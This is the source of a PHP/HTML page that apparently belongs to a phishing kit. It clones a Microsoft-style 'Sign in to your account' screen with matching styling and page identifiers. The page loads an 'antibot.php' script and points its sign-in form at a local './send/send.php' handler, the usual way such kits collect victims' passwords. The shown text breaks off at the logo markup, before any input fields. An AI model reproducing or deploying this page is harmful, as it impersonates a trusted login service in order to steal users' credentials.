<?php
require_once 'antibot.php';
?>
<!DOCTYPE html> <html dir=ltr class lang=en>
<meta charset=utf-8>
<title>Sign in to your account</title>
<meta http-equiv=X-UA-Compatible content="IE=edge">
<meta name=viewport content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
<meta http-equiv=Pragma content=no-cache>
<meta http-equiv=Expires content=-1>
<meta http-equiv=x-dns-prefetch-control content=on>
<meta name=PageID content=ConvergedSignIn>
<meta name=SiteID content>
<meta name=ReqLC content=1033>
<meta name=LocLC content=en-US>
<meta name=format-detection content="telephone=no">

<meta name=robots content=none>
<style>/*! Copyright (C) All rights reserved. *//*!
------------------------------------------- START OF THIRD PARTY NOTICE -----------------------------------------

*//*! normalize.css v3.0.2 | MIT License | git.io/normalize */html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}a{background-color:transparent}a:active,a:hover{outline:0}img{border:0}input{color:inherit;font:inherit;margin:0}html input[type="button"],input[type="submit"]{-webkit-appearance:button;cursor:pointer}*{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}*:before,*:after{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}input{font-family:inherit;font-size:inherit}a:focus{outline:thin dotted;outline-offset:-2px;outline:5px auto -webkit-focus-ring-color}img{vertical-align:middle}html{font-size:100%}body{font-family:"Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";font-weight:400;font-size:.9375rem;line-height:1.25rem;padding-bottom:.227px;padding-top:.227px;background-color:#fff}a{color:#ccc;text-decoration:none}a:link{color:#0067b8}a:visited{color:#0067b8}a:hover{color:#666}a:focus{color:#0067b8}a:active{color:#999}@font-face{font-family:"Segoe UI Webfont";src:local("Segoe UI");font-weight:400;font-style:normal}@font-face{font-family:"Segoe UI Webfont";src:local("Segoe UI Semibold");font-weight:600;font-style:normal}.text-left{text-align:left}.row:before,.row:after{content:" ";display:table}.row:after{clear:both}.col-xs-24,.col-md-24{position:relative;min-height:1px;padding-left:2px;padding-right:2px}.col-xs-24{float:left}.col-xs-24{width:100%}@media (min-width:540px){}@media (min-width:768px){.col-md-24{float:left}.col-md-24{width:100%}}@media (min-width:992px){}@media (min-width:1400px){}.form-control{display:block;width:100%;background-image:none}@media (min-width:540px){}input{max-width:100%;line-height:inherit}input[type="password"]{border-style:solid}.text-input-focus,input[type="color"]:focus,input[type="date"]:focus,input[type="datetime"]:focus,input[type="datetime-local"]:focus,input[type="email"]:focus,input[type="month"]:focus,input[type="number"]:focus,input[type="password"]:focus,input[type="search"]:focus,input[type="tel"]:focus,input[type="text"]:focus,input[type="time"]:focus,input[type="url"]:focus,input[type="week"]:focus,textarea:focus{border-color:#0067b8;background-color:#fff}.text-input-webkit-placeholder,input[type="color"]::-webkit-input-placeholder,input[type="date"]::-webkit-input-placeholder,input[type="datetime"]::-webkit-input-placeholder,input[type="datetime-local"]::-webkit-input-placeholder,input[type="email"]::-webkit-input-placeholder,input[type="month"]::-webkit-input-placeholder,input[type="number"]::-webkit-input-placeholder,input[type="password"]::-webkit-input-placeholder,input[type="search"]::-webkit-input-placeholder,input[type="tel"]::-webkit-input-placeholder,input[type="text"]::-webkit-input-placeholder,input[type="time"]::-webkit-input-placeholder,input[type="url"]::-webkit-input-placeholder,input[type="week"]::-webkit-input-placeholder,textarea::-webkit-input-placeholder{color:rgba(0,0,0,0.6)}input[type="submit"]{padding:4px 12px 4px 12px;position:relative;max-width:100%;text-align:center;white-space:nowrap;overflow:hidden;vertical-align:middle;text-overflow:ellipsis;touch-action:manipulation;border-style:solid;border-width:2px}.btn:hover,.btn:focus,button:hover,button:focus,input[type="button"]:hover,input[type="button"]:focus,input[type="submit"]:hover,input[type="submit"]:focus,input[type="reset"]:hover,input[type="reset"]:focus{border-color:rgba(0,0,0,0.4)}.btn:hover,button:hover,input[type="button"]:hover,input[type="submit"]:hover,input[type="reset"]:hover{cursor:pointer}.btn:active,button:active,input[type="button"]:active,input[type="submit"]:active,input[type="reset"]:active{background-color:rgba(0,0,0,0.4);border-color:transparent}.table{max-width:100%}@media screen and (max-width:539px){}@media (min-width:320px){}@media (min-width:320px){}@media (min-width:320px){}@media (min-width:768px){}@media (min-width:540px){}@media (min-width:768px){}@-ms-viewport{width:device-width}@media (max-width:539px){}@media (max-width:539px){}@media (max-width:539px){}@media (max-width:539px){}@media (min-width:540px) and (max-width:767px){}@media (min-width:540px) and (max-width:767px){}@media (min-width:540px) and (max-width:767px){}@media (min-width:540px) and (max-width:767px){}@media (min-width:768px) and (max-width:991px){}@media (min-width:768px) and (max-width:991px){}@media (min-width:768px) and (max-width:991px){}@media (min-width:768px) and (max-width:991px){}@media (min-width:992px){}@media (min-width:992px){}@media (min-width:992px){}@media (min-width:992px){}@media (max-width:539px){}@media (min-width:540px) and (max-width:767px){}@media (min-width:768px) and (max-width:991px){}@media (min-width:992px){}@media (min-width:1400px){}@media (min-width:1400px){}@media (min-width:1400px){}@media (min-width:1400px){}@media (min-width:1400px){}@font-face{font-family:"Segoe UI Webfont";font-style:italic;font-weight:400;src:local("Segoe UI Italic")}@font-face{font-family:"Segoe UI Webfont";font-style:italic;font-weight:700;src:local("Segoe UI Bold Italic")}a:focus{outline-offset:0}body{direction:ltr}.ltr_override{direction:ltr;text-align:left}.text-secondary{color:rgba(0,0,0,0.7);font-size:13px}body.cb .text-13{font-size:.8125rem}body.cb div.placeholderContainer{width:100%;position:relative}body.cb #signup{white-space:nowrap}.no-padding-left-right{padding-left:0;padding-right:0}@media (max-width:319px){}@media (min-height:800px){}@media (max-height:400px){}@keyframes pulse{from{opacity:.4}}@-o-keyframes pulse{from{opacity:.4}}@-moz-keyframes pulse{from{opacity:.4}}@-webkit-keyframes pulse{from{opacity:.4}}@-webkit-keyframes progressDot{0%,20%{left:0;-webkit-animation-timing-function:ease-out;opacity:0}25%{opacity:1}35%{left:45%;-webkit-animation-timing-function:linear}65%{left:60%;-webkit-animation-timing-function:ease-in}75%{opacity:1}80%,100%{left:100%;opacity:0}}@-moz-keyframes progressDot{0%,20%{left:0;-moz-animation-timing-function:ease-out;opacity:0}25%{opacity:1}35%{left:45%;-moz-animation-timing-function:linear}65%{left:60%;-moz-animation-timing-function:ease-in}75%{opacity:1}80%,100%{left:100%;opacity:0}}@-o-keyframes progressDot{0%,20%{left:0;-o-animation-timing-function:ease-out;opacity:0}25%{opacity:1}35%{left:45%;-o-animation-timing-function:linear}65%{left:60%;-o-animation-timing-function:ease-in}75%{opacity:1}80%,100%{left:100%;opacity:0}}@keyframes progressDot{0%,20%{left:0;animation-timing-function:ease-out;opacity:0}25%{opacity:1}35%{left:45%;animation-timing-function:linear}65%{left:60%;animation-timing-function:ease-in}75%{opacity:1}80%,100%{left:100%;opacity:0}}@keyframes fadeIn{from{opacity:0}to{opacity:1}}@-o-keyframes fadeIn{from{opacity:0}to{opacity:1}}@-moz-keyframes fadeIn{from{opacity:0}to{opacity:1}}@-webkit-keyframes fadeIn{from{opacity:0}to{opacity:1}}body.cb{color:#1b1b1b;text-align:left}body.remove-segoe-ui-symbol:lang(zh){font-family:"Segoe UI",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math"}.background-image{-webkit-animation:fadeIn 1s;-moz-animation:fadeIn 1s;-o-animation:fadeIn 1s;animation:fadeIn 1s}.background-image-holder{background:#f2f2f2}.background-image-holder,.background-image{position:fixed;top:0;width:100%;height:100%}.background-image{background-repeat:no-repeat,no-repeat;background-position:center center,center center;background-size:cover,cover}.footer{position:absolute;left:0;bottom:0;width:100%;overflow:visible;z-index:99;clear:both;min-height:28px}div.footerNode{margin:0;float:right}.footer-content.footer-item{color:#000;font-size:12px;line-height:28px;white-space:nowrap;display:inline-block;margin-left:8px;margin-right:8px}.footer-content.footer-item.debug-item{text-decoration:none;letter-spacing:3px;line-height:22px;vertical-align:top;font-size:16px;font-weight:600}.outer{display:table;position:absolute;height:100%;width:100%}.middle{display:table-cell;vertical-align:middle}.sign-in-box{margin-left:auto;margin-right:auto;position:relative;max-width:440px;width:calc(100% - 40px);padding:44px;background-color:#fff;-webkit-box-shadow:0 2px 6px rgba(0,0,0,0.2);-moz-box-shadow:0 2px 6px rgba(0,0,0,0.2);box-shadow:0 2px 6px rgba(0,0,0,0.2);min-width:320px;min-height:338px;overflow:hidden}.sign-in-box.has-popup{margin-bottom:20px}a:hover{text-decoration:underline}.promoted-fed-cred-box{margin-left:auto;margin-right:auto;position:relative;max-width:440px;width:calc(100% - 40px);margin-bottom:28px;line-height:16px;min-width:320px;padding:0}.promoted-fed-cred-box>*{word-wrap:break-word}.promoted-fed-cred-content{background-color:#fff;-webkit-box-shadow:0 2px 6px rgba(0,0,0,0.2);-moz-box-shadow:0 2px 6px rgba(0,0,0,0.2);box-shadow:0 2px 6px rgba(0,0,0,0.2);padding-left:44px;padding-right:44px}.promoted-fed-cred-content .row.tile .table{padding-top:8px;padding-bottom:8px}.template-section{display:table-row}.template-section.main-section{height:100%}input[type="email"],input[type="password"]{padding:6px 10px;border-width:1px;border-color:rgba(0,0,0,0.6);height:36px;outline:none;border-radius:0;-webkit-border-radius:0;background-color:transparent}.text-input-hover,input[type="color"]:hover,input[type="date"]:hover,input[type="datetime"]:hover,input[type="datetime-local"]:hover,input[type="email"]:hover,input[type="month"]:hover,input[type="number"]:hover,input[type="password"]:hover,input[type="search"]:hover,input[type="tel"]:hover,input[type="text"]:hover,input[type="time"]:hover,input[type="url"]:hover,input[type="week"]:hover,textarea:hover,select:hover{border-color:#323232;border-color:rgba(0,0,0,0.8)}.text-input-focus,input[type="color"]:focus,input[type="date"]:focus,input[type="datetime"]:focus,input[type="datetime-local"]:focus,input[type="email"]:focus,input[type="month"]:focus,input[type="number"]:focus,input[type="password"]:focus,input[type="search"]:focus,input[type="tel"]:focus,input[type="text"]:focus,input[type="time"]:focus,input[type="url"]:focus,input[type="week"]:focus,textarea:focus,select:focus{border-color:#0067b8;background-color:transparent}input[type="submit"]{min-height:32px;border:none;min-width:108px;line-height:normal}.btn-hover,.btn:hover,button:hover,input[type="button"]:hover,input[type="submit"]:hover,input[type="reset"]:hover{background-color:#b2b2b2;background-color:rgba(0,0,0,0.3)}.btn-focus,.btn:focus,button:focus,input[type="button"]:focus,input[type="submit"]:focus,input[type="reset"]:focus{background-color:#b2b2b2;background-color:rgba(0,0,0,0.3);text-decoration:underline;outline:2px solid #000}.btn-active,.btn:active,button:active,input[type="button"]:active,input[type="submit"]:active,input[type="reset"]:active,.btn.btn-primary-active,.btn.btn-primary:active,button.btn-primary:active,input[type="button"].btn-primary:active,input[type="submit"].btn-primary:active,input[type="reset"].btn-primary:active{outline:none;text-decoration:none;-ms-transform:scale(.98);-webkit-transform:scale(.98);transform:scale(.98)}.button.secondary{padding:4px 12px 4px 12px;position:relative;max-width:100%;text-align:center;white-space:nowrap;overflow:hidden;vertical-align:middle;text-overflow:ellipsis;touch-action:manipulation;color:#000;border-style:solid;border-width:2px;border-color:transparent;min-height:32px;border:none;background-color:rgba(0,0,0,0.2);min-width:108px;line-height:normal;margin-top:0;margin-bottom:0;display:block;width:100%}.button.secondary:hover{background-color:#b2b2b2;background-color:rgba(0,0,0,0.3)}.button.secondary:focus{background-color:#b2b2b2;background-color:rgba(0,0,0,0.3);text-decoration:underline;outline:2px solid #000}.button.secondary:active{outline:none;text-decoration:none;-ms-transform:scale(.98);-webkit-transform:scale(.98);transform:scale(.98)}.button.primary{color:#fff;border-color:#0067b8;background-color:#0067b8;display:block;width:100%}.button.primary:hover{background-color:#005da6}.button.primary:focus{background-color:#005da6;text-decoration:underline;outline:2px solid #000}.button.primary:active{outline:none;text-decoration:none;-ms-transform:scale(.98);-webkit-transform:scale(.98);transform:scale(.98)}.logo{max-width:256px;height:24px}.table{width:100%;display:table;table-layout:fixed}.table .table-row{display:table-row}.table .table-cell{display:table-cell;vertical-align:middle}.row{margin-left:0;margin-right:0}.row.tile{margin-bottom:0;outline:none;color:inherit;display:block;margin-left:-44px;margin-right:-44px}.row.tile:not(.no-pick){cursor:pointer}.row.tile:not(.no-pick):hover{background-color:#e6e6e6;background-color:rgba(0,0,0,0.1);color:inherit}.row.tile:not(.no-pick):active{background-color:#b3b3b3;background-color:rgba(0,0,0,0.3);color:inherit}.row.tile .content{line-height:16px;padding-left:12px;padding-right:12px}.row.tile .content>*{word-wrap:break-word}.row.tile .table{padding:12px 44px}.row.tile .table:focus{outline:#000 dashed 1px;background:#ccc;background:rgba(0,0,0,0.1)}.row.tile .table-cell:first-child+.table-cell{width:100%}.tile-img{position:relative}.tile-img.medium{width:32px;height:32px}.form-group{margin-bottom:16px}input[type="submit"]{margin-top:0;margin-bottom:0}.moveOffScreen{position:fixed;bottom:0;right:0;height:0!important;width:0!important;overflow:hidden;opacity:0}.position-buttons>div:first-child{display:inline-block;width:100%;margin-bottom:36px}.button-container{position:absolute;bottom:0;right:0;text-align:right}@media (max-width:600px),(max-height:366px){.background-image-holder,.background-image{display:none}.middle{vertical-align:top}.sign-in-box{padding:24px;margin-top:0;width:100vw;-webkit-box-shadow:none;-moz-box-shadow:none;box-shadow:none;border:0}.sign-in-box.has-popup{padding-bottom:0;margin-bottom:0}.promoted-fed-cred-box{margin-top:0;margin-bottom:88px;width:100vw;padding:0 24px}.promoted-fed-cred-content{-webkit-box-shadow:none;-moz-box-shadow:none;box-shadow:none;padding-left:24px;padding-right:24px;border:1px solid rgba(0,0,0,0.4)}.row.tile{margin-left:-24px;margin-right:-24px}.row.tile .table{padding:12px 24px}.footer{background-color:#fff;filter:none}div.footerNode{float:left;margin:0 24px!important}.footer-content.footer-item{color:#747474}}.inline-block{display:inline-block}input[type="password"]{border-top-width:0;border-left-width:0;border-right-width:0;padding-left:0}.input.text-box{border-style:solid;padding:6px 10px;border-width:1px;border-color:rgba(0,0,0,0.6);height:36px;outline:none;border-radius:0;-webkit-border-radius:0;background-color:transparent;border-top-width:0;border-left-width:0;border-right-width:0;padding-left:0}.input.text-box:focus{background-color:#fff;border-color:#0067b8;background-color:transparent}.input.text-box:hover{border-color:#323232;border-color:rgba(0,0,0,0.8)}.input.text-box::-webkit-input-placeholder{color:rgba(0,0,0,0.6)}.title{line-height:1.75rem;padding-bottom:2.3632px;padding-top:2.3632px;color:#1b1b1b;font-size:1.5rem;font-weight:600;padding:0;margin-top:16px;margin-bottom:12px;font-family:"Segoe UI","Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math"}.pagination-view{position:relative;min-height:206px}.lightbox-cover{background-color:white;opacity:0;z-index:-1;height:100%;width:100%;position:absolute;top:0;left:0;transition:all .5s ease-in;-o-transition:all .5s ease-in;-moz-transition:all .5s ease-in;-webkit-transition:all .5s ease-in}.provide-min-height{min-height:1px}@media (-ms-high-contrast:active){input[type="button"],input[type="submit"]{-ms-high-contrast-adjust:none}.btn:hover,.button:hover,button:hover,input[type="button"]:hover,input[type="submit"]:hover,input[type="reset"]:hover,.btn.btn-google:hover{outline:1px solid windowText;border:1px solid highlight;background-color:highlight;color:highlightText;text-decoration:none}.btn:hover:focus,.button:hover:focus,button:hover:focus,input[type="button"]:hover:focus,input[type="submit"]:hover:focus,input[type="reset"]:hover:focus,.btn.btn-google:hover:focus{outline:1px solid windowText;border:1px solid windowText;background-color:highlight;color:highlightText;text-decoration:underline}.btn:focus,.button:focus,button:focus,input[type="button"]:focus,input[type="submit"]:focus,input[type="reset"]:focus,.btn.btn-google:focus{outline:1px solid windowText;border:1px solid windowText;background-color:window;color:windowText;text-decoration:underline}input[type="submit"].primary,input[type="button"].secondary{outline:1px solid highlight;border:1px solid highlight;background-color:highlight;color:highlightText;text-decoration:none}.btn.btn-primary:hover,.button.btn-primary:hover,button.btn-primary:hover,input[type="button"].btn-primary:hover,input[type="submit"].btn-primary:hover,input[type="reset"].btn-primary:hover,.btn.btn-google.btn-primary:hover,.btn.primary:hover,.button.primary:hover,button.primary:hover,input[type="button"].primary:hover,input[type="submit"].primary:hover,input[type="reset"].primary:hover,.btn.btn-google.primary:hover,.btn.secondary:hover,.button.secondary:hover,button.secondary:hover,input[type="button"].secondary:hover,input[type="submit"].secondary:hover,input[type="reset"].secondary:hover,.btn.btn-google.secondary:hover{outline:1px solid highlight;border:1px solid window;background-color:window;color:highlight;text-decoration:none}.btn.btn-primary:hover:focus,.button.btn-primary:hover:focus,button.btn-primary:hover:focus,input[type="button"].btn-primary:hover:focus,input[type="submit"].btn-primary:hover:focus,input[type="reset"].btn-primary:hover:focus,.btn.btn-google.btn-primary:hover:focus,.btn.primary:hover:focus,.button.primary:hover:focus,button.primary:hover:focus,input[type="button"].primary:hover:focus,input[type="submit"].primary:hover:focus,input[type="reset"].primary:hover:focus,.btn.btn-google.primary:hover:focus,.btn.secondary:hover:focus,.button.secondary:hover:focus,button.secondary:hover:focus,input[type="button"].secondary:hover:focus,input[type="submit"].secondary:hover:focus,input[type="reset"].secondary:hover:focus,.btn.btn-google.secondary:hover:focus{outline:1px solid windowText;border:1px solid window;background-color:window;color:highlight;text-decoration:underline}.btn.btn-primary:focus,.button.btn-primary:focus,button.btn-primary:focus,input[type="button"].btn-primary:focus,input[type="submit"].btn-primary:focus,input[type="reset"].btn-primary:focus,.btn.btn-google.btn-primary:focus,.btn.primary:focus,.button.primary:focus,button.primary:focus,input[type="button"].primary:focus,input[type="submit"].primary:focus,input[type="reset"].primary:focus,.btn.btn-google.primary:focus,.btn.secondary:focus,.button.secondary:focus,button.secondary:focus,input[type="button"].secondary:focus,input[type="submit"].secondary:focus,input[type="reset"].secondary:focus,.btn.btn-google.secondary:focus{outline:1px solid windowText;border:1px solid window;background-color:highlight;color:highlightText;text-decoration:underline}}@media (min-width:768px){}@media (min-width:1084px){}.fade-in-lightbox{animation:fadeIn .3s ease-in;-webkit-animation:fadeIn .3s ease-in;-moz-animation:fadeIn .3s ease-in;-ms-animation:fadeIn .3s ease-in;-o-animation:fadeIn .3s ease-in}.animate{animation-duration:.25s;-webkit-animation-duration:.25s;-moz-animation-duration:.25s;-ms-animation-duration:.25s;-o-animation-duration:.25s;animation-timing-function:cubic-bezier(.5,0,.5,1);-webkit-animation-timing-function:cubic-bezier(.5,0,.5,1);-moz-animation-timing-function:cubic-bezier(.5,0,.5,1);-ms-animation-timing-function:cubic-bezier(.5,0,.5,1);-o-animation-timing-function:cubic-bezier(.5,0,.5,1);animation-fill-mode:both;-webkit-animation-fill-mode:both;-moz-animation-fill-mode:both;-ms-animation-fill-mode:both;-o-animation-fill-mode:both;transition-property:left;-webkit-transition-property:left;-moz-transition-property:left;-ms-transition-property:left;-o-transition-property:left}html[dir=ltr] .animate.slide-in-next{animation-name:show-from-right;-webkit-animation-name:show-from-right;-moz-animation-name:show-from-right;-ms-animation-name:show-from-right;-o-animation-name:show-from-right}@keyframes hide-to-left{from{left:0;opacity:1}to{left:-200px;opacity:0}}@keyframes show-from-right{from{left:200px;opacity:0}to{left:0;opacity:1}}@keyframes hide-to-right{from{left:0;opacity:1}to{left:200px;opacity:0}}@keyframes show-from-left{from{left:-200px;opacity:0}to{left:0;opacity:1}}@-webkit-keyframes hide-to-left{from{left:0;opacity:1}to{left:-200px;opacity:0}}@-webkit-keyframes show-from-right{from{left:200px;opacity:0}to{left:0;opacity:1}}@-webkit-keyframes hide-to-right{from{left:0;opacity:1}to{left:200px;opacity:0}}@-webkit-keyframes show-from-left{from{left:-200px;opacity:0}to{left:0;opacity:1}}@-moz-keyframes hide-to-left{from{left:0;opacity:1}to{left:-200px;opacity:0}}@-moz-keyframes show-from-right{from{left:200px;opacity:0}to{left:0;opacity:1}}@-moz-keyframes hide-to-right{from{left:0;opacity:1}to{left:200px;opacity:0}}@-moz-keyframes show-from-left{from{left:-200px;opacity:0}to{left:0;opacity:1}}@-ms-keyframes hide-to-left{from{left:0;opacity:1}to{left:-200px;opacity:0}}@-ms-keyframes show-from-right{from{left:200px;opacity:0}to{left:0;opacity:1}}@-ms-keyframes hide-to-right{from{left:0;opacity:1}to{left:200px;opacity:0}}@-ms-keyframes show-from-left{from{left:-200px;opacity:0}to{left:0;opacity:1}}@-o-keyframes hide-to-left{from{left:0;opacity:1}to{left:-200px;opacity:0}}@-o-keyframes show-from-right{from{left:200px;opacity:0}to{left:0;opacity:1}}@-o-keyframes hide-to-right{from{left:0;opacity:1}to{left:200px;opacity:0}}@-o-keyframes show-from-left{from{left:-200px;opacity:0}to{left:0;opacity:1}}</style>
</style>
<noscript>
        
    </noscript></head>
<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb remove-segoe-ui-symbol" style=display:block>
 
 
<div>
<div data-bind="if: activeDialog"></div>
<form name=f1 id=i0281 spellcheck=false method=post target=_top autocomplete=off data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: !!activeDialog(), css: { 'provide-min-height': svr.fUseMinHeight }" action="./send/send.php" class=provide-min-height>
 
 <div class=login-paginated-page data-bind="component: { name: 'master-page',
        publicMethods: masterPageMethods,
        params: {
            serverData: svr,
            showButtons: svr.fShowButtons,
            showFooterLinks: true,
            useWizardBehavior: svr.fUseWizardBehavior,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }">
 
 
 <div id=lightboxTemplateContainer data-bind="component: { name: 'lightbox-template', params: { serverData: svr, showHeader: $page.showHeader(), headerLogo: $page.headerLogo() } }, css: { 'provide-min-height': svr.fUseMinHeight }" class=provide-min-height>
<div id=lightboxBackgroundContainer data-bind="css: { 'provide-min-height': svr.fUsePlaywrightMinHeight },
    component: { name: 'background-image-control',
        publicMethods: $page.backgroundControlMethods,
        event: { load: $page.backgroundImageControl_onLoad } }"><div class=background-image-holder role=presentation data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
 
 
 <div id=backgroundImage role=img data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }, ariaLabel: str['STR_Background_Image_AltText']" class="background-image ext-background-image" aria-label="Organization background image" style="background-image:url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxOTIwIiBoZWlnaHQ9IjEwODAiIGZpbGw9Im5vbmUiPjxnIG9wYWNpdHk9Ii4yIiBjbGlwLXBhdGg9InVybCgjRSkiPjxwYXRoIGQ9Ik0xNDY2LjQgMTc5NS4yYzk1MC4zNyAwIDE3MjAuOC02MjcuNTIgMTcyMC44LTE0MDEuNlMyNDE2Ljc3LTEwMDggMTQ2Ni40LTEwMDgtMjU0LjQtMzgwLjQ4Mi0yNTQuNCAzOTMuNnM3NzAuNDI4IDE0MDEuNiAxNzIwLjggMTQwMS42eiIgZmlsbD0idXJsKCNBKSIvPjxwYXRoIGQ9Ik0zOTQuMiAxODE1LjZjNzQ2LjU4IDAgMTM1MS44LTQ5My4yIDEzNTEuOC0xMTAxLjZTMTE0MC43OC0zODcuNiAzOTQuMi0zODcuNi05NTcuNiAxMDUuNjAzLTk1Ny42IDcxNC0zNTIuMzggMTgxNS42IDM5NC4yIDE4MTUuNnoiIGZpbGw9InVybCgjQikiLz48cGF0aCBkPSJNMTU0OC42IDE4ODUuMmM2MzEuOTIgMCAxMTQ0LjItNDE3LjQ1IDExNDQuMi05MzIuNFMyMTgwLjUyIDIwLjQgMTU0OC42IDIwLjQgNDA0LjQgNDM3Ljg1IDQwNC40IDk1Mi44czUxMi4yNzYgOTMyLjQgMTE0NC4yIDkzMi40eiIgZmlsbD0idXJsKCNDKSIvPjxwYXRoIGQ9Ik0yNjUuOCAxMjE1LjZjNjkwLjI0NiAwIDEyNDkuOC00NTUuNTk1IDEyNDkuOC0xMDE3LjZTOTU2LjA0Ni04MTkuNiAyNjUuOC04MTkuNi05ODQtMzY0LjAwNS05ODQgMTk4LTQyNC40NDUgMTIxNS42IDI2NS44IDEyMTUuNnoiIGZpbGw9InVybCgjRCkiLz48L2c+PGRlZnM+PHJhZGlhbEdyYWRpZW50IGlkPSJBIiBjeD0iMCIgY3k9IjAiIHI9IjEiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIiBncmFkaWVudFRyYW5zZm9ybT0idHJhbnNsYXRlKDE0NjYuNCAzOTMuNikgcm90YXRlKDkwKSBzY2FsZSgxNDAxLjYgMTcyMC44KSI+PHN0b3Agc3RvcC1jb2xvcj0iIzEwN2MxMCIvPjxzdG9wIG9mZnNldD0iMSIgc3RvcC1jb2xvcj0iI2M0YzRjNCIgc3RvcC1vcGFjaXR5PSIwIi8+PC9yYWRpYWxHcmFkaWVudD48cmFkaWFsR3JhZGllbnQgaWQ9IkIiIGN4PSIwIiBjeT0iMCIgcj0iMSIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiIGdyYWRpZW50VHJhbnNmb3JtPSJ0cmFuc2xhdGUoMzk0LjIgNzE0KSByb3RhdGUoOTApIHNjYWxlKDExMDEuNiAxMzUxLjgpIj48c3RvcCBzdG9wLWNvbG9yPSIjMDA3OGQ0Ii8+PHN0b3Agb2Zmc2V0PSIxIiBzdG9wLWNvbG9yPSIjYzRjNGM0IiBzdG9wLW9wYWNpdHk9IjAiLz48L3JhZGlhbEdyYWRpZW50PjxyYWRpYWxHcmFkaWVudCBpZD0iQyIgY3g9IjAiIGN5PSIwIiByPSIxIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgZ3JhZGllbnRUcmFuc2Zvcm09InRyYW5zbGF0ZSgxNTQ4LjYgOTUyLjgpIHJvdGF0ZSg5MCkgc2NhbGUoOTMyLjQgMTE0NC4yKSI+PHN0b3Agc3RvcC1jb2xvcj0iI2ZmYjkwMCIgc3RvcC1vcGFjaXR5PSIuNzUiLz48c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiNjNGM0YzQiIHN0b3Atb3BhY2l0eT0iMCIvPjwvcmFkaWFsR3JhZGllbnQ+PHJhZGlhbEdyYWRpZW50IGlkPSJEIiBjeD0iMCIgY3k9IjAiIHI9IjEiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIiBncmFkaWVudFRyYW5zZm9ybT0idHJhbnNsYXRlKDI2NS44IDE5OCkgcm90YXRlKDkwKSBzY2FsZSgxMDE3LjYgMTI0OS44KSI+PHN0b3Agc3RvcC1jb2xvcj0iI2Q4M2IwMSIgc3RvcC1vcGFjaXR5PSIuNzUiLz48c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiNjNGM0YzQiIHN0b3Atb3BhY2l0eT0iMCIvPjwvcmFkaWFsR3JhZGllbnQ+PGNsaXBQYXRoIGlkPSJFIj48cGF0aCBmaWxsPSIjZmZmIiBkPSJNMCAwaDE5MjB2MTA4MEgweiIvPjwvY2xpcFBhdGg+PC9kZWZzPjwvc3ZnPg==)"></div>
 
 
</div></div>
<div class=outer data-bind="css: { 'app': $page.backgroundLogoUrl }">
 
 <div class="template-section main-section">
 <div data-bind="externalCss: { 'middle': true }" class="middle ext-middle">
 <div class=full-height data-bind="component: { name: 'content-control', params: { serverData: svr, isVerticalSplitTemplate: $page.isVerticalSplitTemplate(), hasHeader: showHeader } }">
<div class=flex-column>
 
 
 <div class=win-scroll>
 <div id=lightbox data-bind="
            animationEnd: $page.paginationControlHelper.animationEnd,
            externalCss: { 'sign-in-box': true },
            css: {
                'inner':  $content.isVerticalSplitTemplate,
                'vertical-split-content': $content.isVerticalSplitTemplate,
                'app': $page.backgroundLogoUrl,
                'wide': $page.paginationControlHelper.useWiderWidth,
                'fade-in-lightbox': $page.fadeInLightBox,
                'has-popup': $page.showFedCredAndNewSession &amp;&amp; ($page.showFedCredButtons() || $page.newSession()),
                'transparent-lightbox': $page.backgroundControlMethods() &amp;&amp; $page.backgroundControlMethods().useTransparentLightBox,
                'lightbox-bottom-margin-debug': $page.showDebugDetails,
                'has-header': $content.hasHeader }" class="sign-in-box ext-sign-in-box fade-in-lightbox has-popup">
 
 
 <div class=lightbox-cover data-bind="css: { 'disable-lightbox': svr.fAllowGrayOutLightBox &amp;&amp; showLightboxProgress() }"></div>
 
 
 <div data-bind="component: { name: 'logo-control',
            params: {
                isChinaDc: svr.fIsChinaDc,
                bannerLogoUrl: bannerLogoUrl() } }">
 
